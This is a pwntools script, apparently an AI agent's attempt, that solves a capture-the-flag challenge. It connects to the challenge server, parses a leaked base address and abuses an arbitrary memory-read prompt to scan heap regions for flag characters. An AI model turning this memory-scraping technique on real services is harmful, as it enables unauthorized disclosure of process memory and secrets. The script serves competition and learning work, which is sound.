from pwn import *
import re

HOST = 'zerodayheroes-74cbaa42-doityourself2.kongsberg-ctf.com'
PORT = 1337

context.log_level = 'info'
io = remote(HOST, PORT, ssl=True)

# Get the base address
intro = io.recvline_contains(b'flag is over at').decode()
banner2 = io.recvline().decode()
print(intro.strip())
print(banner2.strip())

m = re.search(r'flag is over at (0x[0-9a-fA-F]+)', intro)
base = int(m.group(1), 16)
print(f'Dict base: {hex(base)}')

def read_memory(addr):
    addr_str = f"{addr:x}"
    io.sendline(addr_str.encode())
    line = io.recvline(timeout=3).decode().strip()
    
    if 'illegal memory address' in line:
        return None
        
    parts = line.split(': ')
    if len(parts) >= 2:
        hex_data = parts[-1].strip()
        try:
            return bytes.fromhex(hex_data)
        except:
            return None
    return None

print("\n=== Deep scan for character strings ===")

reads_used = 0
max_reads = 45
all_chars = {}

# The previous run found pointers around 0x7f2308614700 and 0x7f2307c91fb0
# Let me scan much more broadly around the dict area for string objects

# Strategy: scan in a grid pattern around the base address
scan_ranges = [
    (base - 0x1000, base + 0x2000),  # Around the dict
]

# Add ranges around any heap region we can determine from the base
heap_base = base & ~0xfffff  # Round to 1MB
scan_ranges.append((heap_base, heap_base + 0x10000))  # First 64K of heap

for start, end in scan_ranges:
    print(f"\nScanning range {start:#x} to {end:#x}")
    
    for addr in range(start, end, 0x20):  # Every 32 bytes
        if reads_used >= max_reads - 5:
            break
            
        data = read_memory(addr)
        reads_used += 1
        
        if data:
            # Look for single character strings (likely flag chars)
            chars = []
            for i, b in enumerate(data):
                if 32 <= b <= 126:  # Printable ASCII
                    chars.append((i, chr(b)))
            
            # Look for sequences of printable chars
            text_parts = []
            current_text = ""
            for i, b in enumerate(data):
                if 32 <= b <= 126:
                    current_text += chr(b)
                else:
                    if current_text:
                        text_parts.append(current_text)
                        current_text = ""
            if current_text:
                text_parts.append(current_text)
            
            # Report any interesting findings
            if chars or text_parts:
                char_list = [f"{i}:{c}" for i, c in chars]
                print(f'{addr:#x}: chars=[{",".join(char_list)}] parts={text_parts}')
                
                # Store individual characters that might be flag parts
                for i, c in chars:
                    if c.isalnum() or c in '{}_.,-':
                        all_chars[addr + i] = c
                        
                # Look for flag patterns
                for part in text_parts:
                    if any(pattern in part for pattern in ['K', 'C', 'S', '{', '}', 'flag']):
                        print(f'  *** FLAG PATTERN: "{part}" at {addr:#x} ***')
                        
                    # Single characters are very likely flag components
                    if len(part) == 1 and (part.isalnum() or part in '{}_.,-'):
                        print(f'  *** SINGLE CHAR: "{part}" at {addr:#x} ***')

print(f"\n=== Summary (used {reads_used}/{max_reads} reads) ===")

if all_chars:
    print(f"Found {len(all_chars)} individual characters:")
    for addr in sorted(all_chars.keys()):
        print(f"  {addr:#x}: '{all_chars[addr]}'")
    
    # Try to reconstruct flag from individual characters
    char_values = list(all_chars.values())
    print(f"\nAll characters found: {char_values}")
    
    # Look for KCSC pattern
    if 'K' in char_values and 'C' in char_values and 'S' in char_values:
        print("Found K, C, S - this looks promising for KCSC flag format!")
        
    if '{' in char_values and '}' in char_values:
        print("Found { and } - flag delimiters present!")

else:
    print("No individual characters found. The flag data might be stored differently.")

io.close()